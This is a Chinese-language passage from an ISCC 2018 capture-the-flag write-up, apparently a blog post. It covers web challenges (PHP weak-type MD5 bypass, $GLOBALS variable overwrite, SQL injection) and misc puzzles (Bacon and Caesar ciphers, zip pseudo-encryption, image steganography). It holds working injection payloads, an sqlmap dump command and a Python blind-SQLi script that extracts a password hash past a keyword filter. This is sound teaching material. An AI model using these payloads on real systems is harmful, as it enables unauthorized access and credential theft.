&gt;&lt;/body&gt;&lt;/html&gt;&lt;?phpheader(&quot;content-type:text/html;charset=utf-8&quot;);if(isset($_POST[&apos;username&apos;])&amp;isset($_POST[&apos;password&apos;])){    $username = $_POST[&apos;username&apos;];    $password = $_POST[&apos;password&apos;];}else{    $username=&quot;hello&quot;;    $password=&quot;hello&quot;;}if(md5($password) == 0){    echo &quot;xxxxx&quot;;}show_source(__FILE__);?&gt;</code></pre><p><strong>这里考察php的隐式类型转换，如果用双等号将一个字符串与数字进行比较时，会将字符串类型转为数字类型，所以在这里一般可以利用开头为0的MD5值绕过，以下列举了一些MD5后开头为0的字符串</strong></p><pre><code>QNKCDZO0e830400451993494058024219903391s878926199a0e545993274517709034328855841020s155964671a0e342768416822451524974117254469s214587387a0e848240448830537924465865611904s214587387a0e848240448830537924465865611904s878926199a0e545993274517709034328855841020s1091221200a0e940624217856561557816327384675s1885207154a0e509367213418206700842008763514s1502113478a0e861580163291561247404381396064s1885207154a0e509367213418206700842008763514s1836677006a0e481036490867661113260034900752s155964671a0e342768416822451524974117254469s1184209335a0e072485820392773389523109082030s1665632922a0e731198061491163073197128363787s1502113478a0e861580163291561247404381396064s1836677006a0e481036490867661113260034900752s1091221200a0e940624217856561557816327384675s155964671a0e342768416822451524974117254469s1502113478a0e861580163291561247404381396064s155964671a0e342768416822451524974117254469s1665632922a0e731198061491163073197128363787s155964671a0e342768416822451524974117254469s1091221200a0e940624217856561557816327384675s1836677006a0e481036490867661113260034900752s1885207154a0e509367213418206700842008763514s532378020a0e220463095855511507588041205815s878926199a0e545993274517709034328855841020s1091221200a0e940624217856561557816327384675s214587387a0e848240448830537924465865611904s1502113478a0e861580163291561247404381396064s1091221200a0e940624217856561557816327384675s1665632922a0e731198061491163073197128363787s1885207154a0e509367213418206700842008763514s1836677006a0e481036490867661113260034900752s1665632922a0e731198061491163073197128363787s878926199a0e545993274517709034328855841020</code></pre><p><strong>输入用户名和以上其中一个字符串作为密码</strong><br><img src="http://p008biu9n.bkt.clouddn.com/blog/180516/JCfL3mdhGc.png?imageslim" alt="mark"><br><img src="http://p008biu9n.bkt.clouddn.com/blog/180516/m8Ab2Ia83m.png?imageslim" alt="mark"><br><strong>进入第二关，代码如下</strong></p><pre><code>NULL &lt;?phpinclude &apos;flag.php&apos;;$a = @$_REQUEST[&apos;a&apos;];@eval(&quot;var_dump($$a);&quot;);show_source(__FILE__);?&gt; </code></pre><p><strong>可以看出存在变量覆盖漏洞，利用全局变量’$GLOBALS’覆盖</strong></p><pre><code>http://118.190.152.202:8005/no_md5.php?a=GLOBALS</code></pre><p><img src="http://p008biu9n.bkt.clouddn.com/blog/180516/2ID3G0Jjck.png?imageslim" alt="mark"></p><pre><code>flag:ISCC{a39f9a1ff7eb4bab8a6a21b2ce111b4}</code></pre><h3 id="Sqli"><a href="#Sqli" class="headerlink" title="Sqli"></a>Sqli</h3><p><strong>题目直接说明这是一道注入，打开后是一个登陆框</strong><br><img src="http://p008biu9n.bkt.clouddn.com/blog/180520/BKJ21D2858.png?imageslim" alt="mark"><br><strong>测试一下是否存在注入</strong></p><p><strong>输入</strong></p><pre><code>username=&apos; or 1=1 and 1=1#password=123456</code></pre><p><strong>会直接登陆成功并将我们输入的username:<code>&#39; or 1=1 and 1=1#</code>输出出来</strong><br><img src="http://p008biu9n.bkt.clouddn.com/blog/180520/lbHB1lK397.png?imageslim" alt="mark"><br><strong>输入</strong></p><pre><code>username=&apos; or 1=2 and 1=1#password=123456</code></pre><p><strong>则会显示输入的用户名或密码错误</strong><br><img src="http://p008biu9n.bkt.clouddn.com/blog/180520/9h4A03j9b8.png?imageslim" alt="mark"><br><strong>由此可以判断<code>username</code>参数可能存在注入。大概的登陆验证过程：将输入的username与password拼接成sql查询语句带入数据库查询，如果查到结果便会登陆成功并显示输入的用户名，查询不到结果就会返回用户名或密码错误的提示</strong></p><p><strong>可以看出该处是一个很普通的盲注，可以写脚本也可以直接用sqlmap，这里为了尽快拿到一血直接上sqlmap</strong></p><pre><code>sqlmap.py -r &quot;C:\Users\I&apos;m possible\Desktop\post.txt&quot; -p username --dump -C &quot;kjafuibafuohnuvwnruniguankacbh&quot; -T &quot;news&quot; -D &quot;sqli_database&quot;</code></pre><p><img src="http://p008biu9n.bkt.clouddn.com/blog/180520/G4J8lce8IE.png?imageslim" alt="mark"></p><pre><code>flag{hahaha999999999}</code></pre><h2 id="有种你来绕"><a href="#有种你来绕" class="headerlink" title="有种你来绕"></a>有种你来绕</h2><p><strong>HINT：我都过滤了，看你怎么绕。记住是mysql</strong></p><p><strong>打开后看到是一个登陆框</strong><br><img src="http://p008biu9n.bkt.clouddn.com/blog/180520/5b9D0GfAGf.png?imageslim" alt="mark"><br><strong>结合题目提示猜测是去绕WAF注入，首先测试了一下，发现当用户名正确而密码错误时会返回<code>password error</code>，当用户名错误时会返回<code>username error的错误</code>，于是猜测可能存在盲注。</strong></p><p><strong>测试了一下，发现大概过滤了以下关键字</strong></p><pre><code>#、,、union、--+、and、or、|、%26（&amp;的url编码）</code></pre><p><strong>简单来说，就是不能使用and，or等关键字进行逻辑判断去盲注，同样不能使用注释符去注释后面的语句。谷歌了一下<a href="https://www.anquanke.com/post/id/85936" title="相关的资料" target="_blank" rel="external">相关的资料</a>，发现这种情况可以利用mysql的<a href="http://www.freebuf.com/articles/web/8773.html" title="隐式类型转换" target="_blank" rel="external">隐式类型转换</a>去绕过，类似于php的弱类型。所谓的隐式类型转换，简单来说，就是对mysql的字符类型进行一些加、减、取余等数字操作运算时，又或者是将字符类型与数字类型进行比较时，会将字符类型转为数字类型，比如</strong></p><pre><code>mysql&gt; select &apos;45abcd&apos;-&apos;abc&apos;;+----------------+| &apos;45abcd&apos;-&apos;abc&apos; |+----------------+|             45 |+----------------+1 row in set, 2 warnings (0.02 sec)</code></pre><p><img src="http://p008biu9n.bkt.clouddn.com/blog/180520/66FADIfl31.png?imageslim" alt="mark"><br><strong>在这里将字符串<code>45abcd</code>转为了数字<code>45</code>,将字符串<code>abc</code>转为了数字<code>0</code></strong><br><strong>于是可以得出不是以数字开头的字符串在进行隐式类型转换时都会转为数字0</strong><br><strong>再看</strong></p><pre><code>mysql&gt; select &apos;aaa&apos;=0;+---------+| &apos;aaa&apos;=0 |+---------+|       1 |+---------+1 row in set, 1 warning (0.00 sec)</code></pre><p><img src="http://p008biu9n.bkt.clouddn.com/blog/180520/59e6GD26C4.png?imageslim" alt="mark"><br><strong>在这里将字符串aaa与数字0进行比较时将字符串aaa转为了数字0</strong></p><p><strong>再看以下语句</strong></p><pre><code>mysql&gt; select * from users where username=0;+----+----------+------------+| id | username | password   |+----+----------+------------+|  1 | Dumb     | Dumb       ||  2 | Angelina | I-kill-you ||  3 | Dummy    | p@ssword   ||  4 | secure   | crappy     ||  5 | stupid   | stupidity  ||  6 | superman | genious    ||  7 | batman   | mob!le     ||  8 | admin    | admin      ||  9 | admin1   | admin1     || 10 | admin2   | admin2     || 11 | admin3   | admin3     || 12 | dhakkan  | dumbo      || 14 | admin4   | admin4     |+----+----------+------------+13 rows in set (0.00 sec)    </code></pre><p><img src="http://p008biu9n.bkt.clouddn.com/blog/180520/77f80m2hGC.png?imageslim" alt="mark"><br><strong>可以看到<code>where username=0</code>时会将数据表中所有数据类型查出来，因为username在数据库中的存储类型为varchar类型，也就是字符串类型，在进行比较时会将这些字符串类型全转为数字类型，所以不以数字开头的字符串都会被转成0，从而查询出所有结果</strong></p><p><strong>再看</strong></p><pre><code>mysql&gt; select * from users where username=&apos;&apos;-0-&apos;&apos;;+----+----------+------------+| id | username | password   |+----+----------+------------+|  1 | Dumb     | Dumb       ||  2 | Angelina | I-kill-you ||  3 | Dummy    | p@ssword   ||  4 | secure   | crappy     ||  5 | stupid   | stupidity  ||  6 | superman | genious    ||  7 | batman   | mob!le     ||  8 | admin    | admin      ||  9 | admin1   | admin1     || 10 | admin2   | admin2     || 11 | admin3   | admin3     || 12 | dhakkan  | dumbo      || 14 | admin4   | admin4     |+----+----------+------------+13 rows in set (0.00 sec)    </code></pre><p><img src="http://p008biu9n.bkt.clouddn.com/blog/180520/i6k7I0cFFe.png?imageslim" alt="mark"><br><strong>可以看出当<code>where username=&#39;&#39;-0-&#39;&#39;</code>时会进行隐式类型转换，运算结果相当于<code>where username=0</code>,会返回所有结果</strong></p><p><strong>如果将中间的0变为1，相当于<code>where username=-1</code>,由于数据库里没有以-1开头的字符串，就会返回空</strong></p><pre><code>mysql&gt; select * from users where username=&apos;&apos;-1-&apos;&apos;;Empty set (0.00 sec)    </code></pre><p><img src="http://p008biu9n.bkt.clouddn.com/blog/180520/LhKhC37728.png?imageslim" alt="mark"><br><strong>由此可以看出我们是可以在中间这个位置进行逻辑判断去盲注的</strong></p><p><strong>知道了这些后来返回题目看这道题，构造payload</strong></p><pre><code>uname=&apos;-0-&apos;&amp;passwd=123456</code></pre><p><strong>这里用户名有查询结果，所以会返回<code>password error</code></strong><br><img src="http://p008biu9n.bkt.clouddn.com/blog/180520/E7FLDcFlBk.png?imageslim" alt="mark"><br><strong>构造payload</strong></p><pre><code>uname=&apos;-1-&apos;&amp;passwd=123456</code></pre><p><strong>而这里用户名没有查询结果，所以会返回<code>username error</code>的错误</strong><br><img src="http://p008biu9n.bkt.clouddn.com/blog/180520/5Adfbcg230.png?imageslim" alt="mark"><br><strong>按照这个思路，可以进行逻辑判断进行盲注，构造payload猜出数据库中passwd字段的长度</strong></p><pre><code>uname=&apos;-(length(passwd)=passwd的长度)-&apos;&amp;passwd=123456</code></pre><p><strong>当<code>(length(passwd)=passwd的长度)</code>为真时结果为1，也就是查不出用户名，会返回<code>username error</code>，为假时结果为0，会返回查询结果但是密码错误，也就会返回<code>password error</code></strong><br><img src="http://p008biu9n.bkt.clouddn.com/blog/180520/ebgKLjl969.png?imageslim" alt="mark"><br><img src="http://p008biu9n.bkt.clouddn.com/blog/180520/6800eBgjbK.png?imageslim" alt="mark"><br><strong>通过这种方式可以判断出用户表中有一个长度为32字节的passwd字段</strong></p><p><strong>同样的可以通过这种方式判断出passwd字段中的值，用python写一个脚本即可，贴出我的代码</strong></p><pre><code>import requestsurl=&quot;http://118.190.152.202:8019/login.php&quot;passwd=&quot;&quot;for i in range(1,33):    for j in range(1,256):        data={            &apos;uname&apos;:&quot;&apos;-(ascii(mid((passwd)from(%d)))=%d)-&apos;&quot;%(i,j),            &apos;passwd&apos;:&apos;admin&apos;        }        html=requests.post(url,data=data).content        if &quot;username error!!&quot; in html:            passwd=passwd+chr(j)            print passwd            break</code></pre><p><strong>为了更好的理解脚本，可以看看以下我测试时写的查询语句</strong></p><pre><code>mysql&gt; select mid((password)from(1)) from users;+------------------------+| mid((password)from(1)) |+------------------------+| Dumb                   || I-kill-you             || p@ssword               || crappy                 || stupidity              || genious                || mob!le                 || admin                  || admin1                 || admin2                 || admin3                 || dumbo                  || admin4                 |+------------------------+13 rows in set (0.00 sec)    mysql&gt; select mid((password)from(2)) from users;+------------------------+| mid((password)from(2)) |+------------------------+| umb                    || -kill-you              || @ssword                || rappy                  || tupidity               || enious                 || ob!le                  || dmin                   || dmin1                  || dmin2                  || dmin3                  || umbo                   || dmin4                  |+------------------------+13 rows in set (0.00 sec)    mysql&gt; select ascii(mid((password)from(1))) from users;+-------------------------------+| ascii(mid((password)from(1))) |+-------------------------------+|                            68 ||                            73 ||                           112 ||                            99 ||                           115 ||                           103 ||                           109 ||                            97 ||                            97 ||                            97 ||                            97 ||                           100 ||                            97 |+-------------------------------+13 rows in set (0.00 sec)    mysql&gt; select ascii(mid((password)from(2))) from users;+-------------------------------+| ascii(mid((password)from(2))) |+-------------------------------+|                           117 ||                            45 ||                            64 ||                           114 ||                           116 ||                           101 ||                           111 ||                           100 ||                           100 ||                           100 ||                           100 ||                           117 ||                           100 |+-------------------------------+13 rows in set (0.00 sec)    mysql&gt; select * from users where username=&apos;a&apos;-(ascii(mid((password)from(2)))=117)-&apos;b&apos;;+----+----------+------------+| id | username | password   |+----+----------+------------+|  2 | Angelina | I-kill-you ||  3 | Dummy    | p@ssword   ||  4 | secure   | crappy     ||  5 | stupid   | stupidity  ||  6 | superman | genious    ||  7 | batman   | mob!le     ||  8 | admin    | admin      ||  9 | admin1   | admin1     || 10 | admin2   | admin2     || 11 | admin3   | admin3     || 14 | admin4   | admin4     |+----+----------+------------+11 rows in set, 26 warnings (0.00 sec)    mysql&gt; select * from users where username=&apos;a&apos;-(ascii(mid((password)from(2)))=118)-&apos;b&apos;;+----+----------+------------+| id | username | password   |+----+----------+------------+|  1 | Dumb     | Dumb       ||  2 | Angelina | I-kill-you ||  3 | Dummy    | p@ssword   ||  4 | secure   | crappy     ||  5 | stupid   | stupidity  ||  6 | superman | genious    ||  7 | batman   | mob!le     ||  8 | admin    | admin      ||  9 | admin1   | admin1     || 10 | admin2   | admin2     || 11 | admin3   | admin3     || 12 | dhakkan  | dumbo      || 14 | admin4   | admin4     |+----+----------+------------+13 rows in set, 26 warnings (0.00 sec)    </code></pre><p><strong>最后跑出密码</strong><br><img src="http://p008biu9n.bkt.clouddn.com/blog/180520/6F8e68Ha50.png?imageslim" alt="mark"></p><pre><code>0416af0a8accf2be556a8e131438b814</code></pre><p><strong>MD5在线解密一下，通过密码可以看出出题人素质并不怎么高</strong><br><img src="http://p008biu9n.bkt.clouddn.com/blog/180520/hik351lm3b.png?imageslim" alt="mark"></p><pre><code>nishishabi1438</code></pre><p><strong>用户名<code>admin</code>，密码<code>nishishabi1438</code>，登陆成功</strong><br><img src="http://p008biu9n.bkt.clouddn.com/blog/180520/J8h7d48C81.png?imageslim" alt="mark"><br><strong>后台并没有flag，看提示应该是命名执行，但是试了好多命令都没有回显，最后偶然输入了<code>flag</code>，结果flag就出来了。。。ctm</strong><br><img src="http://p008biu9n.bkt.clouddn.com/blog/180520/I87lF5ffkG.png?imageslim" alt="mark"></p><pre><code>flag{sql_iNjEct_Is_Easy} </code></pre><h2 id="Misc方向"><a href="#Misc方向" class="headerlink" title="Misc方向"></a>Misc方向</h2><h3 id="What-is-that？"><a href="#What-is-that？" class="headerlink" title="What is that？"></a>What is that？</h3><p><strong>HINT：Where is the FLAG？</strong><br><img src="http://p008biu9n.bkt.clouddn.com/blog/180504/h28Le5LE80.png?imageslim" alt="mark"><br><strong>下载下来发现是一个图片，图片中一个手指向下指，图片名为WhatIsThat，于是猜测下面有一部分因为高度的问题没有显示出来，查看图片属性中的分辨率</strong><br><img src="http://p008biu9n.bkt.clouddn.com/blog/180504/FH2K6mE9JG.png?imageslim" alt="mark"><br><strong>将500转为16进制</strong><br><img src="http://p008biu9n.bkt.clouddn.com/blog/180504/j6a0iCgBai.png?imageslim" alt="mark"><br><strong>用winhex16进制编辑工具打开，查找500的16进制，修改图片的高度，看看能不能将图片的下面显示出来</strong><br><img src="http://p008biu9n.bkt.clouddn.com/blog/180504/5eJmBcdcd7.png?imageslim" alt="mark"><br><img src="http://p008biu9n.bkt.clouddn.com/blog/180504/E5HjlBi8fd.png?imageslim" alt="mark"><br><img src="http://p008biu9n.bkt.clouddn.com/blog/180504/j73lkBK07e.png?imageslim" alt="mark"><br><strong>可以看到flag已经出现</strong><br><img src="http://p008biu9n.bkt.clouddn.com/blog/180504/9896a394g8.png?imageslim" alt="mark"><br><code>Flag={_Welcome_To_ISCC_2018_}</code></p><h3 id="秘密电报"><a href="#秘密电报" class="headerlink" title="秘密电报"></a>秘密电报</h3><p><strong>HINT:知识就是力量</strong></p><pre><code>秘密电报：知识就是力量 ABAAAABABBABAAAABABAAABAAABAAABAABAAAABAAAABA</code></pre><p><strong>混过密码吧的我明显看出是培根密码，该密码有两种密码表，第一次选密码表选错了，直接写python解密</strong></p><pre><code>e=(&quot;ABAAAABABBABAAAABABAAABAAABAAABAABAAAABAAAABA&quot;).lower()d={&apos;aaaaa&apos;:&apos;A&apos;,&apos;aaaab&apos;:&apos;B&apos;,&apos;aaaba&apos;:&apos;C&apos;,&apos;aaabb&apos;:&apos;D&apos;,&apos;aabaa&apos;:&apos;E&apos;,&apos;aabab&apos;:&apos;F&apos;,&apos;aabba&apos;:&apos;G&apos;,&apos;aabbb&apos;:&apos;H&apos;,&apos;abaaa&apos;:&apos;I&apos;,&apos;abaab&apos;:&apos;J&apos;,&apos;ababa&apos;:&apos;K&apos;,&apos;ababb&apos;:&apos;L&apos;,&apos;abbaa&apos;:&apos;M&apos;,&apos;abbab&apos;:&apos;N&apos;,&apos;abbba&apos;:&apos;O&apos;,&apos;abbbb&apos;:&apos;P&apos;,&apos;baaaa&apos;:&apos;Q&apos;,&apos;baaab&apos;:&apos;R&apos;,&apos;baaba&apos;:&apos;S&apos;,&apos;baabb&apos;:&apos;T&apos;,&apos;babaa&apos;:&apos;U&apos;,&apos;babab&apos;:&apos;V&apos;,&apos;babba&apos;:&apos;W&apos;,&apos;babbb&apos;:&apos;X&apos;,&apos;bbaaa&apos;:&apos;Y&apos;,&apos;bbaab&apos;:&apos;Z&apos;}for i in range(0,len(e)/5):    a=e[5*i:5*i+5]    for j in d.keys():        if a==j:            print d[j]            break#另一个密码表#&apos;AAAAA&apos;:&apos;a&apos;,#&apos;AAAAB&apos;:&apos;b&apos;,#&apos;AAABA&apos;:&apos;c&apos;,#&apos;AAABB&apos;:&apos;d&apos;,#&apos;AABAA&apos;:&apos;e&apos;,#&apos;AABAB&apos;:&apos;f&apos;,#&apos;AABBA&apos;:&apos;g&apos;,#&apos;AABBB&apos;:&apos;h&apos;,#&apos;ABAAA&apos;:&apos;i&apos;,#&apos;ABAAA&apos;:&apos;j&apos;,#&apos;ABAAB&apos;:&apos;k&apos;,#&apos;ABABA&apos;:&apos;l&apos;,#&apos;ABABB&apos;:&apos;m&apos;,#&apos;ABBAA&apos;:&apos;n&apos;,#&apos;ABBAB&apos;:&apos;o&apos;,#&apos;ABBBA&apos;:&apos;p&apos;,#&apos;ABBBB&apos;:&apos;q&apos;,#&apos;BAAAA&apos;:&apos;r&apos;,#&apos;BAAAB&apos;:&apos;s&apos;,#&apos;BAABA&apos;:&apos;t&apos;,#&apos;BAABB&apos;:&apos;u&apos;,#&apos;BAABB&apos;:&apos;v&apos;,#&apos;BABAA&apos;:&apos;w&apos;,#&apos;BABAB&apos;:&apos;x&apos;,#&apos;BABBA&apos;:&apos;y&apos;,#&apos;BABBB&apos;:&apos;z&apos;</code></pre><p><img src="http://p008biu9n.bkt.clouddn.com/blog/180504/72h93k8km6.png?imageslim" alt="mark"><br><strong>也可以直接在线解密</strong><br><img src="http://p008biu9n.bkt.clouddn.com/blog/180504/KeaecDEf7k.png?imageslim" alt="mark"><br><code>flag:ILIKEISCC</code></p><h3 id="暴力XX不可取"><a href="#暴力XX不可取" class="headerlink" title="暴力XX不可取"></a>暴力XX不可取</h3><p><strong>HINT：A同学要去参加今年的ISCC。大赛在即，A同学准备了一批暴力破解工具，你感觉这个靠谱吗？</strong><br><strong>下载下来后是个看似加密过的zip压缩包</strong><br><img src="http://p008biu9n.bkt.clouddn.com/blog/180504/gEGGkIb3jm.png?imageslim" alt="mark"><br><strong>但是题目名就是说的暴力破解不可取，于是首先想到的就是zip伪加密，对于zip伪加密，首先要了解zip文件的16进制格式，winhex打开我们下载的压缩包</strong><br><img src="http://p008biu9n.bkt.clouddn.com/blog/180504/k7Jbg0fAgC.png?imageslim" alt="mark"><br><strong>下面来说一下压缩包的16进制文件格式</strong></p><pre><code>一个zip文件由三部分组成，压缩源文件数据区+压缩源文件目录区+压缩源文件目录结束标志压缩源文件数据区： 50 4B 03 04：这是头文件标记（0x04034b50） 14 00：解压文件所需 pkware 版本 00 00：全局方式位标记（有无加密） 08 00：压缩方式 4E A0：最后修改文件时间 08 49：最后修改文件日期 91 08 EE B9：CRC-32校验（B9EE0891） 11 00 00 00：压缩后尺寸（17） 0F 00 00 00：未压缩尺寸（15） 08 00：文件名长度 00 00：扩展记录长度压缩源文件目录区： 50 4B 01 02：目录中文件文件头标记(0x02014b50) 3F 00：压缩使用的 pkware 版本 14 00：解压文件所需 pkware 版本 07 08：全局方式位标记（有无加密，这个更改这里进行伪加密，第二个加密位如果为奇数，打开就会提示有密码了，在这里第二个加密位为07，所以确实是伪加密） 08 00：压缩方式 4E A0：最后修改文件时间 08 49：最后修改文件日期 91 08 EE B9：CRC-32校验（B9EE0891） 11 00 00 00：压缩后尺寸（17） 0F 00 00 00：未压缩尺寸（15） 08 00：文件名长度 24 00：扩展字段长度 00 00：文件注释长度 00 00：磁盘开始号 00 00：内部文件属性 20 00 00 00：外部文件属性 00 00 00 00：局部头部偏移量压缩源文件目录结束标志： 50 4B 05 06：目录结束标记 00 00：当前磁盘编号 00 00：目录区开始磁盘编号 01 00：本磁盘上纪录总数 01 00：目录区中纪录总数 5A 00 00 00：目录区尺寸大小 37 00 00 00：目录区对第一张磁盘的偏移量 00 00：ZIP 文件注释长度</code></pre><p><strong>通过介绍可以看出这里的压缩文件确实存在伪加密，由于压缩源文件目录区的全局方式标记位标记的第二个加密位控制着压缩文件是否为伪加密，为奇数时就为伪加密，为偶数时正常，所以我们将这一位改为08保存，再次打开就不会显示加密了</strong><br><img src="http://p008biu9n.bkt.clouddn.com/blog/180504/8ilhjlJ5cj.png?imageslim" alt="mark"><br><strong>可以看到flag文件里的内容</strong><br><img src="http://p008biu9n.bkt.clouddn.com/blog/180504/kDheF0j5J6.png?imageslim" alt="mark"><br><strong>但是提交不成功，猜想此处做了加密，想到凯撒加密的套路，写python脚本解密一下吧</strong></p><pre><code>s=&quot;vfppjrnerpbzvat&quot;for i in range(0,27):    for j in range(0,len(s)):        s=s[:j]+chr(97+(ord(s[j:j+1])-97+1)%26)+s[j+1:]    print s</code></pre><p><img src="http://p008biu9n.bkt.clouddn.com/blog/180504/gd6D8Bhd3C.png?imageslim" alt="mark"><br><strong>找到一个规则的字符串，恩恩，就<code>isccwearecoming</code>吧</strong></p><p><code>flag:isccwearecoming</code></p><h3 id="重重谍影"><a href="#重重谍影" class="headerlink" title="重重谍影"></a>重重谍影</h3><p><strong>HINT：这是一道脑洞题，简单的要命。层层迷雾之后就是答案，刹那便是永恒。南无阿弥陀佛。</strong><br><img src="http://p008biu9n.bkt.clouddn.com/blog/180516/h1KfgBKi00.png?imageslim" alt="mark"></p><pre><code>Vm0wd2QyVkZOVWRXV0doVlYwZG9WVll3WkRSV2JGbDNXa1JTVjAxWGVGWlZNakExVjBaS2RHVkljRnBXVm5CUVZqQmtTMUl4VG5OaFJtUlhaV3RHTkZkWGRHdFRNVXB6V2toV2FsSnNjRmhhVjNoaFYxWmFjMWt6YUZSTlZtdzBWVEo0YzJGR1NuTlhiR2hYWVd0d2RsUnRlR3RqYkdSMFVteFdUbFp0ZHpCV2EyTXhVekZSZUZkc1ZsZGhlbXhoVm01d1IyTldjRVZTYlVacVZtdHdlbGRyVlRWVk1ERldZMFZ3VjJKR2NIWlpWRXBIVWpGT1dXSkhhRlJTVlhCWFZtMDFkMUl3TlhOVmJGcFlZbGhTV1ZWcVFURlRWbEY0VjIxR2FGWnNjSGxaYWs1clZqSkdjbUo2UWxwV1JWcDZWbXBHVDJNeGNFaGpSazVZVWxWd1dWWnRNVEJXTVUxNFdrVmtWbUpHV2xSWlZFNVRWVVpzYzFadVpGUmlSbHBaVkZaU1ExWlhSalpTYTJSWFlsaENVRll3V21Gak1XUnpZVWRHVTFKV2NGRldha0poV1ZkU1YxWnVTbEJXYldoVVZGUktiMDB4V25OYVJFSm9UVlpXTlZaSE5VOVdiVXB5WTBaYVdtRXhjRE5aTW5oVFZqRmFkRkpzWkU1V2JGa3dWbXhrTUdFeVJraFRiRnBYWVd4d1dGWnFUbE5YUmxsNVRWVmFiRkp0VW5wWlZWcFhZVlpLZFZGdWJGZGlXRUpJV1ZSS1QxWXhTblZWYlhoVFlYcFdWVmRYZUZOamF6RkhWMjVTYWxKWVVrOVZiVEUwVjBaYVNFNVZPVmRXYlZKS1ZWZDRhMWRzV2taWGEzaFhUVlp3V0ZwR1pFOVRSVFZZWlVkc1UyRXpRbHBXYWtvd1lURkplRmR1U2s1V1ZscHdWVzB4VTFac1duUk5WazVPVFZkU1dGZHJWbXRoYXpGeVRsVndWbFl6YUZoV2FrWmhZekpPUjJKR1pGTmxhMVYzVjJ0U1IyRXhUa2RWYmtwb1VtdEtXRmxzWkc5a2JHUllaRVprYTJKV1ducFhhMXB2Vkd4T1NHRklRbFZXTTJoTVZqQmFZVk5GTlZaa1JscFRZbFpLU0ZaSGVGWmxSbHBYVjJ0YVQxWldTbFpaYTFwM1dWWndWMXBHWkZSU2EzQXdXVEJWTVZZeVNuSlRWRUpYWWtad2NsUnJXbHBsUmxweVdrWm9hVkpzY0ZsWFYzUnJWVEZaZUZkdVVtcGxhMHB5VkZaYVMxZEdXbk5oUnpsWVVteHNNMWxyVWxkWlZscFhWbGhvVjFaRldtaFdha3BQVWxaU2MxcEhhRTVpUlc4eVZtdGFWMkV4VVhoYVJXUlVZa2Q0Y1ZWdGRIZGpSbHB4VkcwNVZsWnRVbGhXVjNSclYyeGFjMk5GYUZkaVIyaHlWbTB4UzFaV1duSlBWbkJwVW14d2IxZHNWbUZoTWs1elZtNUtWV0pHV2s5V2JHaERVMVphY1ZKdE9XcE5WbkJaVld4b2IxWXlSbk5UYldoV1lURmFhRlJVUm1GamJIQkhWR3hTVjJFelFqVldSM2hoWVRGU2RGTnJXbXBTVjFKWVZGWmFTMUpHYkhGU2JrNVlVbXR3ZVZkcldtdGhWa2w1WVVjNVYxWkZTbWhhUkVaaFZqRldjMWRzWkZoU01taFFWa1phWVdReFNuTldXR3hyVWpOU2IxVnRkSGRXYkZwMFpVaE9XbFpyY0ZsV1YzQlBWbTFXY2xkdGFGWmlXRTE0Vm0xNGExWkdXbGxqUms1U1ZURldObFZyVGxabGJFcENTbFJPUlVwVVRrVSUzRA==</code></pre><p><strong>可以看到及似一串base64编码，<a href="http://www1.tc711.com/tool/BASE64.htm" title="base64在线解码" target="_blank" rel="external">base64在线解码</a>一下</strong></p><p><strong>直到不能解码为止，发现是一个类似AES加密的密文</strong><br><img src="http://p008biu9n.bkt.clouddn.com/blog/180516/2IkK0dA8d1.png?imageslim" alt="mark"></p><pre><code>U2FsdGVkX183BPnBd50ynIRM3o8YLmwHaoi8b8QvfVdFHCEwG9iwp4hJHznrl7d4%0AB5rKClEyYVtx6uZFIKtCXo71fR9Mcf6b0EzejhZ4pnhnJOl+zrZVlV0T9NUA+u1z%0AiN+jkpb6ERH86j7t45v4Mpe+j1gCpvaQgoKC0Oaa5kc%3D</code></pre><p><strong>处理一下</strong></p><pre><code>U2FsdGVkX183BPnBd50ynIRM3o8YLmwHaoi8b8QvfVdFHCEwG9iwp4hJHznrl7d4B5rKClEyYVtx6uZFIKtCXo71fR9Mcf6b0EzejhZ4pnhnJOl+zrZVlV0T9NUA+u1ziN+jkpb6ERH86j7t45v4Mpe+j1gCpvaQgoKC0Oaa5kc=</code></pre><p><strong>之后<a href="http://tool.oschina.net/encrypt" title="AES在线解密" target="_blank" rel="external">AES在线解密</a>一下</strong><br><img src="http://p008biu9n.bkt.clouddn.com/blog/180516/k7Hhm7g8hh.png?imageslim" alt="mark"><br><strong>发现解密出来的东西很像是一个名为<code>与佛论禅</code>的加密</strong></p><pre><code>缽娑遠呐者若奢顛悉呐集梵提梵蒙夢怯倒耶哆般究有栗</code></pre><p><strong>拿到<a href="http://www.keyfc.net/bbs/tools/tudoucode.aspx" title="与佛论禅" target="_blank" rel="external">与佛论禅</a>的网站解密一下，注意解密方法</strong></p><p><img src="http://p008biu9n.bkt.clouddn.com/blog/180516/mlHB71g3Db.png?imageslim" alt="mark"><br><strong>所以这道题的flag就是</strong></p><pre><code>把我复制走</code></pre><p><strong>南无阿弥陀佛~</strong></p><h3 id="数字密文"><a href="#数字密文" class="headerlink" title="数字密文"></a>数字密文</h3><p><strong>HINT:这里有个很简单的flag，藏在下面这串数字里，猜猜吧！69742773206561737921</strong></p><p><strong>可以看出这像是一串16进制编码，解码一下即可</strong><br><img src="http://p008biu9n.bkt.clouddn.com/blog/180516/5bFI9F3Fg6.png?imageslim" alt="mark"></p><pre><code>flag:it&apos;s easy!</code></pre><h3 id="一只猫的心思"><a href="#一只猫的心思" class="headerlink" title="一只猫的心思"></a>一只猫的心思</h3><p><strong>下载附件解压后是一个图片</strong><br><img src="http://p008biu9n.bkt.clouddn.com/blog/180516/BhhBab5h33.png?imageslim" alt="mark"><br><strong>用winhex查看一下，发现有字符区域WPS字样，猜测图片里隐藏了word文档，因为word文档（doc、xls）的文件头16进制为<code>D0CF11E0</code>，于是尝试查找16进制</strong><br><img src="http://p008biu9n.bkt.clouddn.com/blog/180516/6Kddage3bb.png?imageslim" alt="mark"><br><strong>可以看出在<code>D0CF11E0</code>在<code>FFD9</code>尾部（jpg的文件尾16进制为FFD9），所以图片里确实藏有doc文档，位置还是在jpg图片的尾部</strong><br><img src="http://p008biu9n.bkt.clouddn.com/blog/180516/j22G2BG4aB.png?imageslim" alt="mark"><br><strong>知道了这些后，接下来用winhex将doc文档从图片中分离出来，选中属于word文件的16进制区域，右键，Edit-&gt;Copy Block-&gt;Into New Flie</strong><br><img src="http://p008biu9n.bkt.clouddn.com/blog/180516/kfe41m3IIi.png?imageslim" alt="mark"><br><strong>用WPS打开noname文件</strong><br><img src="http://p008biu9n.bkt.clouddn.com/blog/180516/8eJd74J1J8.png?imageslim" alt="mark"><br><strong>可以看出内容又是一串经过<code>与佛论禅</code>加密后的密文，去与佛论禅网站在线解密一下</strong><br><img src="http://p008biu9n.bkt.clouddn.com/blog/180516/i9L72dDc0K.png?imageslim" 